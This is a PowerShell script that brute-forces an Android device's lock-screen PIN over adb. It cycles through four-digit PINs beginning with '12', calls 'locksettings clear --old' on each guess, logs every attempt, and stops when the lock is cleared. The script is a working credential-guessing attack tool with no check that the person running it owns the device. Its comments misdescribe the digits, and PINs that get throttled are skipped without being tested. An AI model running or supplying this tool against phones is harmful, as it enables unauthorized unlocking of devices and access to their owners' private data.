# Fixed first three digits
$fixedPart = "12"

# Define the log file path
$logFilePath = ".\log.txt"

# Check if the file exists, if not, create it
if (-not (Test-Path $logFilePath)) {
    Write-Host "Log file does not exist, creating log.txt..." -ForegroundColor Yellow
    New-Item -Path $logFilePath -ItemType File
} else {
    # Clear the contents of the file
    Clear-Content $logFilePath
}

# Loop to generate the last two digits in reverse (from 99 to 00)
for ($randomPart1 = 9; $randomPart1 -ge 0; $randomPart1--) {
    for ($randomPart2 = 9; $randomPart2 -ge 0; $randomPart2--) {
        # Generate the complete password
        $password = "$fixedPart$randomPart1$randomPart2"
        
        # Log the current password we are trying
        $logMessage = "Trying password: $password"
        $logMessage | Out-File -Append -FilePath $logFilePath
        Write-Host "Trying password: $password" -ForegroundColor Cyan  # Displaying the password on the console

        # Use adb to clear the lock settings
        $command = & "C:\Users\r\Downloads\platform-tools\adb.exe" shell locksettings clear --old $password 2>&1

        # Log actual adb response for debugging
        $adbOutput = "ADB Output: $command"
        $adbOutput | Out-File -Append -FilePath $logFilePath

        # Check the output to determine success
        if ($command -like "*Lock credential cleared*" -or $command -like "*successful*") {
            $successMessage = "Correct password, lock settings cleared: $password"
            $successMessage | Out-File -Append -FilePath $logFilePath
            Write-Host $successMessage -ForegroundColor Green
            break 2  # Exit both loops
        } elseif ($command -like "*Request throttled*") {
            # Log throttling but immediately skip to next password
            $throttleMessage = "Request throttled, skipping to next password..."
            $throttleMessage | Out-File -Append -FilePath $logFilePath
            Write-Host $throttleMessage -ForegroundColor Yellow
        } else {
            # Log unmatched cases
            $unmatchedMessage = "Unmatched output: $command"
            $unmatchedMessage | Out-File -Append -FilePath $logFilePath
            Write-Host $unmatchedMessage -ForegroundColor Red
        }
    }

    # Reset retry count after each outer loop iteration
}
